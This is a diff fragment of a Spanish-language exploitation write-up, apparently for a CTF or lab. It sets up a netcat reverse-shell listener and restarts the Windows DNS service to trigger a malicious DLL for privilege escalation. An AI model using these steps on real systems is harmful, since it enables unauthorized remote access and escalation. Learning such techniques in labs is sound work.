@@ -143,9 +143,14 @@ para realizar esta explotación primero vamos a crear un `archivo.dll` que conte
 
 ❯ rlwrap -cAr nc -lvnp 9001
 
- # detenemos el servi
+ # detenemos el servicio dns
+❯ sc.exe stop dns
+
+ # iniciamos nuevamente el servicio
+❯ sc.exe start dns
 ```
 
+de esta manera al i
 ![[Pasted image 20240723003958.png]]
 
 
